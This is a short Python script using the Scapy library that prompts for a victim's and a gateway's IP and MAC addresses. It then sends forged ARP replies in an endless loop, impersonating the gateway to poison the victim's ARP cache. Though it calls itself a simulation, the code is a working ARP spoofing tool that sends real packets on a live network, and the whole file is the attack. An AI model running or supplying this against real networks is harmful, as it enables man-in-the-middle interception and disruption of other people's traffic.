from scapy.all import *

# Function to get user input for IP and MAC addresses
def get_user_input():
    target_ip = input("Enter the target IP (victim): ")
    gateway_ip = input("Enter the gateway IP: ")
    target_mac = input("Enter the target MAC address (victim): ")
    gateway_mac = input("Enter the gateway MAC address: ")
    return target_ip, gateway_ip, target_mac, gateway_mac

# Function to perform ARP spoofing
def arp_spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    # Create the ARP response packet to spoof the victim
    arp_response = ARP(
        op=2,                # is-at (response)
        pdst=target_ip,      # Destination IP (victim)
        hwdst=target_mac,    # Destination MAC (victim)
        psrc=gateway_ip      # Source IP (gateway)
    )

    # Send the spoofed ARP response
    print(f"Sending ARP spoof packet to {target_ip} (victim), pretending to be {gateway_ip} (gateway)")
    send(arp_response, verbose=False)

# Main script execution
if __name__ == "__main__":
    print("ARP Spoofing Simulation")
    target_ip, gateway_ip, target_mac, gateway_mac = get_user_input()
    try:
        while True:
            arp_spoof(target_ip, gateway_ip, target_mac, gateway_mac)
    except KeyboardInterrupt:
        print("\nARP Spoofing stopped.")
